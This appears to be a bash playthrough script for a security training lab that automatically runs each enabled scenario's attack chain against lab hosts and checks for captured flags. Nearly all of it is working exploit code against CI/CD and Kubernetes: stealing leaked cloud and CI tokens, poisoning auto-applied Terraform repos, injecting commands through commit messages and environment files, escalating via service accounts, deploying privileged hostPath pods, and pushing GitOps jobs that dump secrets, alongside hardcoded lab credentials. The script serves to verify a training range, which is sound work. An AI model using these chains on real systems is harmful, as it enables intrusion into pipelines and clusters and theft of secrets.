#!/usr/bin/env bash
# playthrough.sh — runs ON the edge (operator/controller). ACTUALLY exploits each ENABLED scenario
# as a player on the VPC would, and checks the planted flag. Proves the kill-chains fire end-to-end
# (not just that artifacts exist). New tracks are appended here as M2 lands them.
#   usage (from repo root, via orchestrator):  ./orchestrator/lab verify   (or scp + run on edge)
OP=/opt/minilab2/op.key
S="ssh -i $OP -o StrictHostKeyChecking=no -o ConnectTimeout=15"
on(){ h="$1"; shift; $S root@"$h" "$@"; }
AU=svc-admin; AP='Min2lab-Adm!n-2026'; G=http://gitea:3000
PASS=0; FAIL=0; declare -a FAILED
ok(){ printf '  \033[1;32mPASS\033[0m %-6s %s\n' "$1" "$2"; PASS=$((PASS+1)); }
no(){ printf '  \033[1;31mFAIL\033[0m %-6s %s\n' "$1" "$2"; FAIL=$((FAIL+1)); FAILED+=("$1"); }
# chk <id> <flag-inner> <captured-output>
chk(){ if echo "$3" | grep -q "MINILAB{$2}"; then ok "$1" "captured MINILAB{$2}"; \
       else no "$1" "no flag (got: $(echo "$3" | tr -d '\n' | head -c160))"; fi; }
enabled(){ grep -qxF "$1" /opt/minilab2/enabled_scenarios 2>/dev/null; }
# rsx <host> <user> — run a script read from stdin on <host> as <user>, via base64 (no quoting hell)
rsx(){ local host="$1" user="$2" b64; b64=$(base64 -w0)
  if [ "$user" = root ]; then on "$host" "echo $b64 | base64 -d | bash"
  else on "$host" "f=/tmp/.rsx.$$; echo $b64 | base64 -d > \$f; chmod 755 \$f; su $user -c \"bash \$f\"; rm -f \$f"; fi; }

echo "### Terraform / IaC kill-chains ###"

# --- tf_3: cross-team remote state exfil -------------------------------------
# foothold on the alpha apply host (atlantis) -> loot leaked beta cloud creds ->
# use them against MinIO to read team beta's remote state (cross-tenant boundary break).
if enabled tf_3; then
  creds=$(on atlantis "cat /home/deployer/.beta/creds 2>/dev/null")
  bk=$(echo "$creds" | sed -n 's/AWS_ACCESS_KEY_ID=//p'); bs=$(echo "$creds" | sed -n 's/AWS_SECRET_ACCESS_KEY=//p')
  if [ -n "$bk" ] && [ -n "$bs" ]; then
    out=$(on backend "mc alias set tf3 http://127.0.0.1:9000 '$bk' '$bs' >/dev/null 2>&1 && mc cat tf3/tf-state-beta/prod/terraform.tfstate 2>/dev/null")
    chk tf_3 tf_3-cross-team-state "$out"
  else no tf_3 "no leaked beta creds on atlantis"; fi
fi

# --- tf_4: writable auto-applied IaC + scheduled apply (deployer identity) ----
# attacker with SCM write poisons the repo the cron drift-apply pulls; the scheduled
# `iac-apply.sh` then runs attacker code as the privileged deployer -> reads deployer's flag.
if enabled tf_4; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
  cat > "$W/infra/pwn.tf" <<'TF'
resource "null_resource" "pwn" {
  triggers = { ts = timestamp() }   # re-fire on every apply (repeatable kill-chain)
  provisioner "local-exec" { command = "cat /home/deployer/flag.txt > /tmp/tf4-proof 2>/dev/null" }
}
TF
  ( cd "$W/infra" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "drift fix" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  on atlantis "rm -f /tmp/tf4-proof; su deployer -c /usr/local/bin/iac-apply.sh" >/dev/null 2>&1
  chk tf_4 tf_4-state-poisoning "$(on atlantis 'cat /tmp/tf4-proof 2>/dev/null')"
fi

# --- tf_5: transitive module exec (trusted module pulls a submodule w/ a provisioner) ---
# consume the "trusted" alpha/tf-modules//note; it now transitively sources a nested module
# whose local-exec fires on apply -> writes the proof. Player applies a tiny consumer.
if enabled tf_5; then
  out=$(rsx atlantis deployer <<'EOF'
set -e
cd /home/deployer; rm -rf pt5; mkdir pt5; cd pt5
cat > main.tf <<'TF'
module "note" {
  source = "git::http://gitea:3000/alpha/tf-modules.git//note?ref=main"
  name   = "pt5"
}
TF
rm -f /tmp/tf5-proof
/usr/local/bin/terraform init -input=false -no-color >/dev/null 2>&1
/usr/local/bin/terraform apply -auto-approve -no-color >/dev/null 2>&1
cat /tmp/tf5-proof 2>/dev/null
EOF
)
  chk tf_5 tf_5-transitive-module "$out"
fi

# --- tf_6: over-privileged apply identity -> cluster-admin kubeconfig -> crown secret ---
# the apply host holds a cluster-admin kubeconfig (over-priv). Use its client cert to hit the
# k8s API directly (no kubectl needed) and read a kube-system secret only cluster-admin can see.
if enabled tf_6; then
  out=$(rsx atlantis root <<'EOF'
set -e
K=/home/deployer/.kube/config
T=$(mktemp -d)
grep 'certificate-authority-data' "$K" | awk '{print $2}' | base64 -d > "$T/ca"
grep 'client-certificate-data'    "$K" | awk '{print $2}' | base64 -d > "$T/crt"
grep 'client-key-data'            "$K" | awk '{print $2}' | base64 -d > "$T/key"
curl -s --cacert "$T/ca" --cert "$T/crt" --key "$T/key" \
  https://k8s:6443/api/v1/namespaces/kube-system/secrets/crown \
  | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
rm -rf "$T"
EOF
)
  chk tf_6 tf_6-k8s-rbac-backdoor "$out"
fi

echo "### GitOps / Kubernetes kill-chains ###"

# --- k8s_1: ArgoCD AppProject escape -> deploy a Job into the restricted platform namespace ----
if enabled k8s_1; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  cat > "$W/app/deploy/escape.yaml" <<'YML'
apiVersion: batch/v1
kind: Job
metadata: { name: exfil, namespace: platform }
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: x
        image: busybox:1.36
        command: ["sh","-c","echo FOUND=$CROWN"]
        env:
        - name: CROWN
          valueFrom: { secretKeyRef: { name: crown, key: flag } }
YML
  ( cd "$W/app" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "add monitor job" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
k3s kubectl -n platform delete job exfil --ignore-not-found >/dev/null 2>&1
k3s kubectl -n argocd annotate app alpha-app argocd.argoproj.io/refresh=hard --overwrite >/dev/null 2>&1
for i in $(seq 1 40); do k3s kubectl -n platform get job exfil >/dev/null 2>&1 && break; sleep 3; done
for i in $(seq 1 25); do
  p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break
  sleep 3
done
p=$(k3s kubectl -n platform get pods -l job-name=exfil -o name 2>/dev/null | head -1)
[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
EOF
)
  chk k8s_1 k8s_1-argo-project-escape "$out"
fi

# --- k8s_2: pipeline SA -> create pod as a parked cluster-admin SA -> cross-team secret ----
if enabled k8s_2; then
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
TOK=$(k3s kubectl -n alpha create token alpha-ci)
KA="k3s kubectl --server=https://127.0.0.1:6443 --insecure-skip-tls-verify --token=$TOK"
k3s kubectl -n alpha delete pod esc --ignore-not-found >/dev/null 2>&1
cat <<'POD' | $KA -n alpha apply -f - >/dev/null 2>&1
apiVersion: v1
kind: Pod
metadata: { name: esc }
spec:
  serviceAccountName: alpha-deploy
  restartPolicy: Never
  containers:
  - name: x
    image: curlimages/curl:8.10.1
    command: ["sh","-c","T=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl -s --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt -H \"Authorization: Bearer $T\" https://kubernetes.default.svc/api/v1/namespaces/beta/secrets/rbac-crown"]
POD
for i in $(seq 1 30); do
  ph=$(k3s kubectl -n alpha get pod esc -o jsonpath='{.status.phase}' 2>/dev/null)
  { [ "$ph" = Succeeded ] || [ "$ph" = Running ]; } && break; sleep 2
done
sleep 4
k3s kubectl -n alpha logs esc 2>/dev/null | sed -n 's/.*"flag": *"\([^"]*\)".*/\1/p' | base64 -d 2>/dev/null
EOF
)
  chk k8s_2 k8s_2-rbac-escalation "$out"
fi

# --- k8s_3: Flux kustomize-controller (cluster-admin) reconciles attacker-writable Git path ----
if enabled k8s_3; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
  mkdir -p "$W/infra/fleet"
  cat > "$W/infra/fleet/kustomization.yaml" <<'YML'
apiVersion: kustomize.config.k8s.io/v1beta1
kind: Kustomization
resources: [exfil.yaml]
YML
  cat > "$W/infra/fleet/exfil.yaml" <<'YML'
apiVersion: batch/v1
kind: Job
metadata: { name: flux-exfil, namespace: platform }
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: x
        image: busybox:1.36
        command: ["sh","-c","echo FOUND=$CROWN"]
        env:
        - name: CROWN
          valueFrom: { secretKeyRef: { name: flux-crown, key: flag } }
YML
  ( cd "$W/infra" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "fleet manifests" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
k3s kubectl -n platform delete job flux-exfil --ignore-not-found >/dev/null 2>&1
TS=$(date +%s)
k3s kubectl -n flux-system annotate gitrepository fleet reconcile.fluxcd.io/requestedAt="$TS" --overwrite >/dev/null 2>&1
k3s kubectl -n flux-system annotate kustomization fleet reconcile.fluxcd.io/requestedAt="$TS" --overwrite >/dev/null 2>&1
for i in $(seq 1 50); do k3s kubectl -n platform get job flux-exfil >/dev/null 2>&1 && break; sleep 3; done
for i in $(seq 1 25); do
  p=$(k3s kubectl -n platform get pods -l job-name=flux-exfil -o name 2>/dev/null | head -1)
  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break; sleep 3
done
p=$(k3s kubectl -n platform get pods -l job-name=flux-exfil -o name 2>/dev/null | head -1)
[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
EOF
)
  chk k8s_3 k8s_3-flux-controller-rce "$out"
fi

# --- k8s_4: exposed ArgoCD API + weak admin -> create+sync an app into a restricted namespace ----
if enabled k8s_4; then
  W=$(mktemp -d)
  git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  mkdir -p "$W/app/k4"
  cat > "$W/app/k4/job.yaml" <<'YML'
apiVersion: batch/v1
kind: Job
metadata: { name: k4-exfil, namespace: platform }
spec:
  backoffLimit: 0
  template:
    spec:
      restartPolicy: Never
      containers:
      - name: x
        image: busybox:1.36
        command: ["sh","-c","echo FOUND=$CROWN"]
        env:
        - name: CROWN
          valueFrom: { secretKeyRef: { name: crown4, key: flag } }
YML
  ( cd "$W/app" && git -c user.email=atk@x -c user.name=atk add -A \
    && { git -c user.email=atk@x -c user.name=atk commit -q -m "k4 manifests" || true; } \
    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
GIP=$(getent hosts gitea | awk '{print $1}' | head -1)
A=https://127.0.0.1:30443
TOK=$(curl -sk $A/api/v1/session -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
[ -z "$TOK" ] && { echo LOGIN-FAILED; exit 0; }
k3s kubectl -n platform delete job k4-exfil --ignore-not-found >/dev/null 2>&1
cat > /tmp/k4app.json <<JSON
{"metadata":{"name":"k4pwn"},"spec":{"project":"default","source":{"repoURL":"http://$GIP:3000/alpha/app.git","targetRevision":"main","path":"k4"},"destination":{"server":"https://kubernetes.default.svc","namespace":"platform"},"syncPolicy":{"automated":{}}}}
JSON
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' $A/api/v1/applications -d @/tmp/k4app.json >/dev/null 2>&1
sleep 2
curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' "$A/api/v1/applications/k4pwn/sync" -d '{}' >/dev/null 2>&1
for i in $(seq 1 40); do k3s kubectl -n platform get job k4-exfil >/dev/null 2>&1 && break; sleep 3; done
for i in $(seq 1 20); do
  p=$(k3s kubectl -n platform get pods -l job-name=k4-exfil -o name 2>/dev/null | head -1)
  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break; sleep 3
done
p=$(k3s kubectl -n platform get pods -l job-name=k4-exfil -o name 2>/dev/null | head -1)
[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
rm -f /tmp/k4app.json
EOF
)
  chk k8s_4 k8s_4-argocd-weak-admin "$out"
fi

echo "### IaC / policy / access-control kill-chains ###"

# --- tf_1: malicious provider via .terraformrc redirect -> provider binary runs on plan ----
if enabled tf_1; then
  out=$(rsx atlantis deployer <<'EOF'
cd /home/deployer; rm -rf pt1; mkdir pt1; cd pt1
cat > main.tf <<'TF'
terraform {
  required_providers { null = { source = "hashicorp/null" } }
}
resource "null_resource" "x" {}
TF
rm -f /tmp/tf1-proof
/usr/local/bin/terraform plan -no-color >/dev/null 2>&1 || true
cat /tmp/tf1-proof 2>/dev/null
EOF
)
  chk tf_1 tf_1-malicious-provider "$out"
fi

# --- pol_3: Kyverno namespace-exclusion gap admits a privileged hostPath pod -> node flag ----
if enabled pol_3; then
  out=$(rsx k8s root <<'EOF'
export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
k3s kubectl -n alpha delete pod pol3 --ignore-not-found >/dev/null 2>&1
cat <<'POD' | k3s kubectl apply -f - >/dev/null 2>&1
apiVersion: v1
kind: Pod
metadata: { name: pol3, namespace: alpha }
spec:
  restartPolicy: Never
  containers:
  - name: x
    image: busybox:1.36
    securityContext: { privileged: true }
    command: ["sh","-c","cat /host/pol3-flag.txt"]
    volumeMounts: [{ name: h, mountPath: /host }]
  volumes:
  - name: h
    hostPath: { path: /opt/minilab2 }
POD
for i in $(seq 1 30); do
  ph=$(k3s kubectl -n alpha get pod pol3 -o jsonpath='{.status.phase}' 2>/dev/null)
  { [ "$ph" = Succeeded ] || [ "$ph" = Running ]; } && break; sleep 2
done
sleep 2
k3s kubectl -n alpha logs pol3 2>/dev/null
EOF
)
  chk pol_3 pol_3-kyverno-admission-bypass "$out"
fi

# --- pbac_4: over-scoped CI bot token leaked on the runner -> clone another team's private repo ----
if enabled pbac_4; then
  tok=$(on runner "sed -n 's/GITEA_BOT_TOKEN=//p' /opt/ci-bot.env 2>/dev/null")
  if [ -n "$tok" ]; then
    W=$(mktemp -d)
    git clone -q "http://ci-bot:$tok@gitea:3000/platform/secrets.git" "$W/s" 2>/dev/null
    out=$(cat "$W/s/CROWN.md" 2>/dev/null); rm -rf "$W"
    chk pbac_4 pbac_4-overscoped-token "$out"
  else no pbac_4 "no leaked token on runner"; fi
fi

echo "### Pipeline execution / injection kill-chains (Gitea Actions) ###"

# --- ppe_1: untrusted commit message interpolated into a run: step -> RCE on the runner ----
if enabled ppe_1; then
  on runner 'rm -f /tmp/ppe1-proof' >/dev/null 2>&1
  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  ( cd "$W/app"; date > .ppe1-trig
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m 'pwned"; cat /opt/minilab2/ppe1-flag.txt > /tmp/ppe1-proof; echo "x'
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/ppe1-proof ] && break; sleep 3; done; cat /tmp/ppe1-proof 2>/dev/null')
  chk ppe_1 ppe_1-expression-injection "$out"
fi

# --- ppe_3: attacker edits the config file loaded into $GITHUB_ENV -> defines $DEPLOY_CMD ----
if enabled ppe_3; then
  on runner 'rm -f /tmp/ppe3-proof' >/dev/null 2>&1
  W=$(mktemp -d); git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
  ( cd "$W/app"
    printf 'APP_VERSION=1.0\nDEPLOY_CMD=cat /opt/minilab2/ppe3-flag.txt > /tmp/ppe3-proof\n' > ci/release.env
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "bump release config"
    git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 50); do [ -s /tmp/ppe3-proof ] && break; sleep 3; done; cat /tmp/ppe3-proof 2>/dev/null')
  chk ppe_3 ppe_3-github-env-injection "$out"
fi

# --- ppe_2: push an attacker branch whose pipeline reads the unprotected secret (GitLab, shell) ----
if enabled ppe_2; then
  on runner 'rm -f /tmp/ppe2-proof' >/dev/null 2>&1
  W=$(mktemp -d)
  git clone -q "http://oauth2:glpat-minilab2automation01@gitlab.minilab2.lab/beta/web-store.git" "$W/ws" 2>/dev/null
  cat > "$W/ws/.gitlab-ci.yml" <<'YML'
stages: [exfil]
pwn:
  stage: exfil
  tags: [shell]
  script:
    - echo "$DEPLOY_SECRET" > /tmp/ppe2-proof
YML
  ( cd "$W/ws"
    git -c user.email=atk@x -c user.name=atk checkout -q -B attacker
    git -c user.email=atk@x -c user.name=atk add -A
    git -c user.email=atk@x -c user.name=atk commit -q -m "ci tweak"
    git -c user.email=atk@x -c user.name=atk push -q -f origin attacker ) 2>/dev/null
  rm -rf "$W"
  out=$(on runner 'for i in $(seq 1 60); do [ -s /tmp/ppe2-proof ] && break; sleep 3; done; cat /tmp/ppe2-proof 2>/dev/null')
  chk ppe_2 ppe_2-fork-mr-secret-exfil "$out"
fi

echo
printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
[ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
exit 0
